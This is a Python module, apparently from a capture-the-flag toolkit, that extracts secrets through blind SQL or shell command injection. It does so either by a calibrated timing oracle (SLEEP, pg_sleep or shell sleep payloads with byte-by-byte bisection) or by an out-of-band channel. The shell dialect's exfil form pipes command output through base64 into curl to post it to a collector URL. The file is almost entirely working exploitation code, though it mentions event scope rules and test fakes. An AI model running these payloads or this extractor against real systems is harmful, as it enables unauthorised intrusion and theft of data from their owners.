#!/usr/bin/env python3
"""Calibrated blind extraction over a timing or an out-of-band channel (B-255, coverage matrix WR5).

The pieces existed apart: ``web_exploit.probe_cmdi_time`` FINDS a timing signal, ``tools/oob.py``
CATCHES a callback, ``sqli_exfil.reconstruct_from_log`` rebuilds a secret from a saved log. Nothing
turned a live blind injection into a value. This is that adapter, one interface for both channels:

  * ``TimingChannel`` first calibrates: it sends the same payload with a known-true and a known-false
    condition, interleaved, ``samples`` times each. The two payloads differ only in the condition (a
    WAF that slows any ``SLEEP`` slows both), so the channel is usable only when every true reading is
    slower than every false one by a clear gap and the median gap is at least 0.8 of the asked delay.
    Otherwise it doubles the delay up to ``max_delay`` and, failing that, raises CalibrationError with
    the readings. Each later answer is decided against the calibrated threshold; a reading inside the
    guard band around it is asked again (``retries``), a false control is re-read every
    ``recheck_every`` questions and a drift recalibrates, and every recovered character is confirmed
    with an equality question before it is kept.
  * ``OobChannel`` sends one payload that makes the target post the value to the collector and reads
    the hit back (tools/oob.py's hit log, or any ``hits(token)`` callable). It is chosen only on a
    CONFIRMED reachability report (``oob.py reach``): a callback from a target, never an assumption.

``choose_channel(mode, reach)`` makes the choice explicit: ``"timing"``, ``"oob"`` (refused unless the
report is confirmed, and made for this collector: same base URL, and the same listener start when the
current state is passed) or ``"auto"`` (oob when so confirmed, else timing), and the result says which
and why. ``extract(...)`` runs it end to end, and looks the current listener up (``oob.running()``)
unless it is passed.

Dialects render the questions: ``MYSQL``, ``POSTGRES`` and ``SHELL`` (POSIX sh; ``SHELL`` also has the
out-of-band exfil form). ``wrap(snippet) -> payload`` places a snippet in the injectable request
(``lambda s: "1' AND " + s + "-- -"``, ``lambda s: "x; " + s``).

This module sends nothing by itself and names no host: ``send(payload)`` is the caller's (a WebClient
through ``web_sender``, which keeps the event scope guard), returning the elapsed seconds (a float, or
a response dict with ``elapsed``). Whether to fire blind payloads at a live target is the event's rules
and the player's call; build work and tests use in-process fakes only.
"""
from __future__ import annotations

import base64
import statistics
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


class BlindError(RuntimeError):
    """The channel could not answer (no elapsed time, no callback, an unconfirmable character)."""

    def __init__(self, msg, *, partial: bytes = b"", detail=None):
        super().__init__(msg)
        self.partial = partial
        self.detail = detail


class CalibrationError(BlindError):
    """The true and false readings do not separate at any delay tried (``detail`` holds them)."""


class ChannelUnusable(BlindError):
    """The asked channel cannot be used here (out-of-band without a confirmed reachability report)."""


class BudgetExhausted(BlindError):
    """``max_requests`` was reached; ``partial`` holds the bytes recovered so far."""


# ------------------------------------------------------------------------------------------- dialects

def _num(d: float) -> str:
    return f"{float(d):g}"


@dataclass(frozen=True)
class Dialect:
    """How one back end asks a yes/no question with a delay, and (optionally) posts a value out of band.
    ``expr`` is the value's expression in that language (a subquery, a shell command)."""
    name: str
    timed: Callable[[str, float], str]
    len_gt: Callable[[str, int], str]
    char_gt: Callable[[str, int, int], str]
    char_eq: Callable[[str, int, int], str]
    true: str
    false: str
    exfil: Callable[[str, str], str] | None = None


MYSQL = Dialect(
    "mysql",
    timed=lambda c, d: f"IF(({c}),SLEEP({_num(d)}),0)",
    len_gt=lambda e, n: f"CHAR_LENGTH(({e}))>{int(n)}",
    char_gt=lambda e, i, c: f"ASCII(SUBSTRING(({e}),{int(i)},1))>{int(c)}",
    char_eq=lambda e, i, c: f"ASCII(SUBSTRING(({e}),{int(i)},1))={int(c)}",
    true="1=1", false="1=0")

POSTGRES = Dialect(
    "postgres",
    timed=lambda c, d: f"(CASE WHEN ({c}) THEN (SELECT 1 FROM pg_sleep({_num(d)})) ELSE 1 END)=1",
    len_gt=lambda e, n: f"LENGTH(({e}))>{int(n)}",
    char_gt=lambda e, i, c: f"ASCII(SUBSTRING(({e}),{int(i)},1))>{int(c)}",
    char_eq=lambda e, i, c: f"ASCII(SUBSTRING(({e}),{int(i)},1))={int(c)}",
    true="1=1", false="1=0")


def _sh_byte(e: str, i: int) -> str:
    # byte i (1-based) of the command's raw output (a pipe, so NUL bytes and trailing newlines count)
    return f'"$( ( {e} ) | head -c {int(i)} | tail -c 1 | od -An -tu1 | tr -d \' \\n\')"'


SHELL = Dialect(
    "shell",
    timed=lambda c, d: f"if {c}; then sleep {_num(d)}; fi",
    len_gt=lambda e, n: f'[ "$( ( {e} ) | wc -c | tr -d \' \')" -gt {int(n)} ]',
    char_gt=lambda e, i, c: f"[ {_sh_byte(e, i)} -gt {int(c)} ] 2>/dev/null",
    char_eq=lambda e, i, c: f"[ {_sh_byte(e, i)} -eq {int(c)} ] 2>/dev/null",
    true="true", false="false",
    exfil=lambda e, url: f"( {e} ) | base64 | tr -d '\\n' | curl -s -m 5 --data-binary @- {url}")

DIALECTS = {d.name: d for d in (MYSQL, POSTGRES, SHELL)}


# ------------------------------------------------------------------------------------------- channels

def _elapsed_of(r) -> float:
    if isinstance(r, dict):
        r = r.get("elapsed")
    if r is None or isinstance(r, bool):
        raise BlindError("send() gave no elapsed time (return seconds, or a response dict with 'elapsed')")
    return float(r)


@dataclass
class Calibration:
    delay: float
    threshold: float
    guard: float
    true_readings: list
    false_readings: list
    attempts: list = field(default_factory=list)
    low: float = float("-inf")      # a later reading outside [low, high] means the latency moved: recalibrate
    high: float = float("inf")

    def as_dict(self) -> dict:
        return {"delay": self.delay, "threshold": round(self.threshold, 4), "guard": round(self.guard, 4),
                "envelope": [round(self.low, 4), round(self.high, 4)],
                "true": [round(x, 4) for x in self.true_readings],
                "false": [round(x, 4) for x in self.false_readings], "attempts": self.attempts}


class _Counted:
    def __init__(self, send, max_requests):
        self._send = send
        self.max_requests = int(max_requests)
        self.requests = 0

    def _fire(self, payload):
        if self.requests >= self.max_requests:
            raise BudgetExhausted(f"max_requests ({self.max_requests}) reached")
        self.requests += 1
        return self._send(payload)


class TimingChannel(_Counted):
    """A yes/no oracle read from response time. Call calibrate() first (ask() does it when needed)."""
    kind = "timing"

    def __init__(self, send, wrap, dialect: Dialect, *, delay=2.0, max_delay=None, samples=4, retries=3,
                 recheck_every=32, max_requests=4000, max_recalibrations=6):
        super().__init__(send, max_requests)
        if float(delay) <= 0:
            raise ValueError("delay must be above 0 seconds")
        if int(samples) < 2:
            raise ValueError("samples must be at least 2 per side")
        self.wrap, self.dialect = wrap, dialect
        self.delay = float(delay)
        self.max_delay = float(max_delay) if max_delay is not None else self.delay
        self.samples, self.retries, self.recheck_every = int(samples), max(1, int(retries)), int(recheck_every)
        self.max_recalibrations = int(max_recalibrations)
        self.cal: Calibration | None = None
        self.asked = 0
        self.recalibrations = 0

    def _time(self, cond, delay=None) -> float:
        return _elapsed_of(self._fire(self.wrap(self.dialect.timed(cond, self.delay if delay is None else delay))))

    def calibrate(self) -> Calibration:
        delay, attempts = self.delay, []
        while True:
            t, f = [], []
            for _ in range(self.samples):          # interleaved, so slow drift hits both sides alike
                t.append(self._time(self.dialect.true, delay))
                f.append(self._time(self.dialect.false, delay))
            gap = min(t) - max(f)
            med = statistics.median(t) - statistics.median(f)
            spread = max(max(t) - min(t), max(f) - min(f))
            # A few samples under-state the jitter: the unseen tail reaches about one observed spread past
            # the extremes, so the gap must be at least that wide, as well as a quarter of the delay.
            ok = gap > 0.25 * delay and gap >= spread and med >= 0.8 * delay
            attempts.append({"delay": delay, "gap": round(gap, 4), "median_gap": round(med, 4),
                             "spread": round(spread, 4), "ok": ok})
            if ok:
                self.delay = delay
                guard = gap / 4
                # the envelope readings should stay in: each side widened by its own observed spread
                low = min(f) - (max(f) - min(f)) - guard
                high = max(t) + (max(t) - min(t)) + guard
                self.cal = Calibration(delay, (min(t) + max(f)) / 2, guard, t, f, attempts, low, high)
                return self.cal
            if delay * 2 <= self.max_delay:
                delay *= 2
                continue
            raise CalibrationError(
                f"no timing signal: true and false readings do not separate at delay {_num(delay)} s "
                f"(gap {gap:.3f} s, median gap {med:.3f} s, jitter spread {spread:.3f} s; need a gap above 0.25x "
                "the delay and at least the spread, and a median gap of 0.8x the delay). Raise max_delay within the client's timeout, or the condition never runs",
                detail={"attempts": attempts, "true": t, "false": f})

    def _read(self, cond):
        """True/False from one decisive reading; "drift" for a reading outside the calibrated envelope;
        None when every try fell inside the guard band around the threshold."""
        for _ in range(self.retries):
            e = self._time(cond)
            if not (self.cal.low <= e <= self.cal.high):
                return "drift"
            if abs(e - self.cal.threshold) > self.cal.guard:
                return e > self.cal.threshold
        return None

    def _recalibrate(self, why):
        if self.recalibrations >= self.max_recalibrations:
            raise CalibrationError(f"the channel keeps drifting ({why}) after {self.recalibrations} recalibrations",
                                   detail=self.cal.as_dict() if self.cal else None)
        self.recalibrations += 1
        self.calibrate()

    def ask(self, cond) -> bool:
        """One yes/no answer. A false control is re-read every `recheck_every` questions; a reading out
        of the envelope, a control that does not read false, or a question that stays in the guard
        band recalibrates and asks again (at most max_recalibrations times, then CalibrationError)."""
        if self.cal is None:
            self.calibrate()
        self.asked += 1
        if self.recheck_every and self.asked % self.recheck_every == 0:
            if self._read(self.dialect.false) is not False:
                self._recalibrate("the false control did not read false")
        while True:
            ans = self._read(cond)
            if isinstance(ans, bool):
                return ans
            self._recalibrate("a reading left the calibrated envelope" if ans == "drift"
                              else "readings stay inside the guard band")

    def describe(self) -> dict:
        return {"calibration": self.cal.as_dict() if self.cal else None, "recalibrations": self.recalibrations}


def _oob(why):
    try:
        import oob  # tools/ is on the engine sys.path (conftest, ctf run)
    except ModuleNotFoundError as e:
        raise BlindError(f"tools/oob.py is not importable: {why}") from e
    return oob


def oob_hits(token) -> list:
    """The collector's logged hits for a token (tools/oob.py, every day's file)."""
    return _oob("pass hits=<callable(token) -> rows>").read_hits(token=token, every=True)


def listener_base(listener) -> str:
    """The base URL a listener state serves, as tools/oob.py shows it (oob.shown_base: the public URL,
    else the bind and port), so a report's `listener.base` and this compare in one format."""
    oob = _oob("cannot render the listener's base URL")
    try:
        return str(oob.shown_base(listener)).rstrip("/")
    except KeyError as e:
        raise BlindError(f"the listener state has no public_url and no {e.args[0]} (pass oob.running())") from e


def decode_hit(row) -> bytes:
    """The value a callback carried: a base64 body (SHELL.exfil posts one), else the path's d= value
    (the XXE DTD form). BlindError when the hit carries neither."""
    body = row.get("body")
    if body is None and row.get("body_b64"):
        body = base64.b64decode(row["body_b64"]).decode("ascii", "replace")
    if body and body.strip() and body.strip() != "ok":
        try:
            return base64.b64decode("".join(body.split()), validate=True)
        except ValueError as e:
            raise BlindError(f"the callback body is not base64: {body[:60]!r}") from e
    q = urllib.parse.urlsplit(str(row.get("path") or "")).query
    vals = urllib.parse.parse_qs(q, keep_blank_values=True).get("d")
    if vals:
        return vals[0].encode("utf-8", "surrogateescape")
    raise BlindError("the callback carries no value (no body, no d= parameter)")


class OobChannel(_Counted):
    """One request per value: the target posts it to the collector; the hit is read back by token."""
    kind = "oob"

    def __init__(self, send, wrap, dialect: Dialect, *, base, token, hits=oob_hits, wait=20.0, poll=0.5,
                 sleep=time.sleep, clock=time.monotonic, max_requests=10):
        super().__init__(send, max_requests)
        if dialect.exfil is None:
            raise ChannelUnusable(f"the {dialect.name} dialect has no out-of-band form: use the timing channel")
        if not str(base).startswith(("http://", "https://")):
            raise ValueError("base is the collector's URL (oob.py url/payloads print it)")
        self.wrap, self.dialect = wrap, dialect
        self.base, self.token = str(base).rstrip("/"), str(token)
        self.hits, self.wait, self.poll, self.sleep, self.clock = hits, float(wait), float(poll), sleep, clock
        self.n = 0

    def fetch(self, expr) -> bytes:
        self.n += 1
        tag = f"x{self.n}"
        url = f"{self.base}/{self.token}/{tag}"
        want = f"/{self.token}/{tag}"
        self._fire(self.wrap(self.dialect.exfil(expr, url)))
        deadline = self.clock() + self.wait
        while True:
            for r in self.hits(self.token):
                if urllib.parse.urlsplit(str(r.get("path") or "")).path == want:
                    return decode_hit(r)
            if self.clock() >= deadline:
                raise BlindError(f"no callback to {want} within {self.wait:g} s: the payload did not run, or the "
                                 "target cannot reach the collector now (oob.py reach)")
            self.sleep(self.poll)

    def describe(self) -> dict:
        return {"base": self.base, "token": self.token}


# ---------------------------------------------------------------------------------------- extraction

def reach_mismatch(reach, base=None, listener=None) -> str | None:
    """Why a reachability report does not vouch for this collector, or None when it does. A report
    proves the route to the listener it was made for (its `listener.base`, and `started`): a listener
    that moved (a new bind, port or quick-tunnel URL) or restarted needs a new `oob.py reach`. `base`
    is the collector URL the payload will use; `listener` the current state (oob.running(); {} when
    none is up). With neither there is nothing to compare and None is returned."""
    if base is None and listener is None:
        return None
    rl = (reach or {}).get("listener") or {}
    if not rl.get("base"):
        return "the report names no listener, so it proves no route to this collector"
    made_for = str(rl["base"]).rstrip("/")
    if base is not None and made_for != str(base).rstrip("/"):
        return f"the report was made for {made_for}, not {str(base).rstrip('/')} (the listener moved: oob.py reach again)"
    if listener is not None:
        if not listener:
            return "no listener is up now (oob.py up, then oob.py reach)"
        now = listener_base(listener)
        if now != made_for:
            return f"the listener now serves {now}, not {made_for} (oob.py reach again)"
        if listener.get("started") != rl.get("started"):
            return (f"the report was made for a listener started at {rl.get('started')}; this one started at "
                    f"{listener.get('started')} (oob.py reach again)")
    return None


def choose_channel(mode: str, reach: dict | None = None, *, base=None, listener=None) -> tuple:
    """(channel kind, why). "oob" needs a CONFIRMED reachability report (oob.py reach) made for this
    collector (reach_mismatch, given `base` and/or the current `listener`) and is refused otherwise;
    "auto" picks oob only then and says why it took timing instead."""
    verdict = (reach or {}).get("verdict")
    stale = reach_mismatch(reach, base, listener) if verdict == "confirmed" else None
    if mode == "timing":
        return "timing", "timing asked for"
    if mode == "oob":
        if verdict != "confirmed":
            raise ChannelUnusable(f"out-of-band needs a confirmed reachability report (oob.py reach); this one is "
                                  f"{verdict or 'missing'}: a target was never seen calling back")
        if stale:
            raise ChannelUnusable(f"out-of-band refused: the confirmed reachability report does not vouch for this "
                                  f"collector: {stale}")
        return "oob", "reachability confirmed by a target callback"
    if mode == "auto":
        if verdict == "confirmed" and not stale:
            return "oob", "auto: reachability confirmed by a target callback"
        if stale:
            return "timing", f"auto: the confirmed reachability report is for another listener ({stale}), so timing"
        return "timing", f"auto: out-of-band not confirmed ({verdict or 'no reachability report'}), so timing"
    raise ValueError(f"mode is timing, oob or auto, not {mode!r}")


def _length(ch: TimingChannel, expr, max_len) -> tuple:
    if not ch.ask(ch.dialect.len_gt(expr, 0)):
        return 0, False
    if ch.ask(ch.dialect.len_gt(expr, max_len)):
        return max_len, True
    lo, hi = 0, 1                         # len > lo is true, len > hi is unknown
    while hi < max_len and ch.ask(ch.dialect.len_gt(expr, hi)):
        lo, hi = hi, min(hi * 2, max_len)
    while hi - lo > 1:                    # invariant: len > lo, not len > hi
        mid = (lo + hi) // 2
        if ch.ask(ch.dialect.len_gt(expr, mid)):
            lo = mid
        else:
            hi = mid
    return hi, False


def _char(ch: TimingChannel, expr, i, lo, hi) -> int | None:
    for a, b in ((lo, hi), (0, 255)) if (lo, hi) != (0, 255) else ((0, 255),):
        x, y = a - 1, b                  # invariant: byte > x, not byte > y
        while y - x > 1:
            mid = (x + y) // 2
            if ch.ask(ch.dialect.char_gt(expr, i, mid)):
                x = mid
            else:
                y = mid
        if ch.ask(ch.dialect.char_eq(expr, i, y)):
            return y
    return None


def extract_timing(ch: TimingChannel, expr, *, max_len=256, lo=32, hi=126, on_byte=None) -> dict:
    """The value of `expr`, byte by byte: its length by doubling then bisection, each byte by bisection
    in [lo, hi] (then 0..255 when the confirm fails), each confirmed by an equality question."""
    if not (0 <= lo <= hi <= 255):
        raise ValueError("lo and hi are byte values with lo <= hi")
    out = bytearray()
    try:
        if ch.cal is None:
            ch.calibrate()
        n, truncated = _length(ch, expr, int(max_len))
        for i in range(1, n + 1):
            b = _char(ch, expr, i, lo, hi)
            if b is None:                    # a misread is likelier than no byte at all: recalibrate once
                ch._recalibrate(f"byte {i} did not confirm")
                b = _char(ch, expr, i, lo, hi)
            if b is None:
                raise BlindError(f"byte {i} could not be confirmed (no value in 0..255 passed the equality check)",
                                 partial=bytes(out))
            out.append(b)
            if on_byte:
                on_byte(i, b)
    except BudgetExhausted as e:
        e.partial = bytes(out)
        raise
    return {"value_bytes": bytes(out), "length": n, "truncated": truncated, "requests": ch.requests,
            "confirmed_bytes": len(out), **ch.describe()}


CURRENT = object()   # extract(listener=CURRENT): look the listener up (oob.running()) when it matters


def extract(expr, *, send, wrap, dialect: Dialect, mode="auto", reach=None, base=None, token=None, hits=oob_hits,
            listener=CURRENT, delay=2.0, max_delay=None, samples=4, max_len=256, lo=32, hi=126, max_requests=4000,
            wait=20.0, sleep=time.sleep, clock=time.monotonic) -> dict:
    """End to end: choose the channel (choose_channel, with `base` and the current `listener` state,
    oob.running(), checked against the report), build it, extract `expr`. `listener` defaults to the
    running listener, looked up only when a confirmed report could open the out-of-band channel (a
    listener restarted on the same URL is then caught); pass a state dict, or None to skip that check
    (the `base` check still applies). Returns {value (text, utf-8 with replacement), value_bytes,
    channel, channel_why, requests, ...}."""
    if listener is CURRENT:
        listener = None
        if mode != "timing" and (reach or {}).get("verdict") == "confirmed":
            listener = _oob("pass listener=<oob.running() state>, or listener=None to skip the check").running()
    kind, why = choose_channel(mode, reach, base=base, listener=listener)
    if kind == "oob":
        if dialect.exfil is None:
            if mode == "oob":
                raise ChannelUnusable(f"the {dialect.name} dialect has no out-of-band form")
            kind, why = "timing", f"{why}; but the {dialect.name} dialect has no out-of-band form, so timing"
        else:
            if not base or not token:
                raise ChannelUnusable("out-of-band needs base= (the collector URL) and token= (oob.py token)")
            ch = OobChannel(send, wrap, dialect, base=base, token=token, hits=hits, wait=wait, sleep=sleep,
                            clock=clock, max_requests=max_requests)
            v = ch.fetch(expr)
            res = {"value_bytes": v, "length": len(v), "truncated": False, "requests": ch.requests,
                   **ch.describe()}
    if kind == "timing":
        ch = TimingChannel(send, wrap, dialect, delay=delay, max_delay=max_delay, samples=samples,
                           max_requests=max_requests)
        res = extract_timing(ch, expr, max_len=max_len, lo=lo, hi=hi)
    res.update({"value": res["value_bytes"].decode("utf-8", "replace"), "channel": kind, "channel_why": why,
                "dialect": dialect.name})
    return res


def web_sender(client, path_template, param=None, *, method="GET", headers=None) -> Callable:
    """send(payload) -> response dict (with `elapsed`) through a toolkits WebClient, placing the payload
    the way web_exploit's probes do (path `{}` slot, or `param`). The client keeps the event scope guard."""
    import web_exploit  # local: only a live run needs the client stack

    def send(payload):
        return web_exploit._send(client, method.upper(), path_template, param, payload, headers)
    return send
